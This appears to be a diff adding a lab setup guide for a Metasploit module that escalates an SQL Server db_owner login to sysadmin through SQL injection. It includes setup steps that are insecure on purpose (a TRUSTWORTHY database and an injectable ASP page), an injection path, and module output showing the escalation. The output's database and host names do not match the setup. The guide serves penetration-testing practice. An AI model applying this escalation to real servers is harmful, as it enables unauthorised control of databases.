@@ -1,0 +1,116 @@
+SQL Server: Escalating from db_Owner to sysadmin via SQL Injection
+Lab setup guide
+
+Below I've provided some basic steps for setting up a SQL Server instance and asp page that can be used to replicate the scenario exploited by the mssql_escalate_dbowner module.
+
+----------------
+Database Setup
+----------------
+
+1.  Download the Microsoft SQL Server Express install that includes SQL Server Management Studio.  It can be download at http://msdn.microsoft.com/en-us/evalcenter/dn434042.aspx
+
+2.  Install SQL Server by following the wizard, but make sure to enabled mixed-mode authentication and run the service as LocalSystem for the sake of the lab.
+
+3.  Log into the SQL Server with the "sa" account setup during installation using the SQL Server Management Studio application.
+
+4.  Press the "New Query" button and use the TSQL below to create a database named "MyAppDb" for the lab. 
+
+-- Create database
+CREATE DATABASE MyAppDb
+
+-- Verify sa is the owner of the application database
+SELECT suser_sname(owner_sid) 
+FROM sys.databases 
+WHERE name = 'MyAppDb'
+
+5.  Press the "New Query" button and use the TSQL below to create a database user named "MyAppUser" for the lab.  In the real world some DBAs create an account like this to allow applications to connect to the database server.
+
+-- Create login
+CREATE LOGIN MyAppUser WITH PASSWORD = 'MyPassword!';
+
+6.  Press the "New Query" button and use the TSQL below to assign "MyAppUser" the "db_owner" role in the "MyAppDb" database.  In the real world a DBA might do this so that the application can access what it needs in its application database once logged in.
+
+-- Setup MyAppUsers the db_owner role in MyAppDb
+USE MyAppDb
+ALTER LOGIN [MyAppUser] with default_database = [MyAppDb];
+CREATE USER [MyAppUser] FROM LOGIN [MyAppUser];
+EXEC sp_addrolemember [db_owner], [MyAppUser];
+
+7.  Confirm the "MyAppUser" was added as db_owner.
+
+-- Verify the user was added as db_owner
+select rp.name as database_role, mp.name as database_user
+from sys.database_role_members drm
+join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
+join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
+
+8.  Set the "MyAppDb" database as trusted using the TSQL below.  DBAs tend to do this when custom stored procedures access tables from other databases or when the custom stored procedures use native stored procedures that access external resources.
+
+-- Flag database as trusted
+ALTER DATABASE MyAppDb SET TRUSTWORTHY ON
+
+9.  The query below will return all of the databases in the SQL Server instance, and the "MyAppDb" and "MSDB" databases should be flagged as trustworthy.
+
+SELECT a.name,b.is_trustworthy_on 
+FROM master..sysdatabases as a
+INNER JOIN sys.databases as b
+ON a.name=b.name;
+
+10. Add a table with records
+
+-- Create table1
+CREATE TABLE dbo.NOCList
+(ID INT IDENTITY PRIMARY KEY,SpyName varchar(MAX) NOT NULL,RealName varchar(MAX) NULL)
+
+-- Add sample records to table
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('James Bond','Sean Connery')
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('Ethan Hunt','Tom Cruise')
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('Jason Bourne','Matt Damon')
+
+11. Verify the table was addded
+
+SELECT * FROM NOCList
+
+----------------
+Web Server Setup
+----------------
+1. Setup a local IIS server 
+2. Make sure its configured to process asp pages
+3. Download testing.asp to web root from https://github.com/nullbind/Metasploit-Modules/blob/master/testing.asp
+4. Update the db_server, db_name, db_username and db_userpassword variables
+5. Verify the page works by accessing: http://127.0.0.1/testing.asp?id=1
+6. Verify the id parameter is injectable and error are returned: http://127.0.0.1/testing.asp?id=@@version
+
+---------------
+Setup Module
+---------------
+use auxiliary/admin/mssql/mssql_escalate_dbowner_sqli
+set GET_PATH  /testing.asp?id=1+and+1=[SQLi];--
+set rhost 127.0.0.1
+
+msf auxiliary(mssql_escalate_dbowner_sqli) > run
+
+[*] Grabbing the database user name from 10.2.9.101:80...
+[+] Database user: MyAppUser
+[*] Checking if MyAppUser is already a sysadmin...
+[+] MyAppUser is NOT a sysadmin, let's try to escalate privileges.
+[*] Checking for trusted databases owned by sysadmins...
+[+] 1 affected database(s) were found:
+[*]  - LVADB
+[*] Checking if MyAppUser has the db_owner role in any of them...
+[+] MyAppUser has the db_owner role on LVADB.
+[*] Attempting to add MyAppUser to sysadmin role...
+[+] Success! MyAppUser is now a sysadmin!
+[*] Auxiliary module execution completed
+
+msf auxiliary(mssql_escalate_dbowner_sqli) > run
+
+[*] Grabbing the database user name from 10.2.9.101:80...
+[+] Database user: MyAppUser
+[*] Checking if MyAppUser is already a sysadmin...
+[+] MyAppUser is already a sysadmin, no esclation needed.
+[*] Auxiliary module execution completed
+msf auxiliary(mssql_escalate_dbowner_sqli) > 
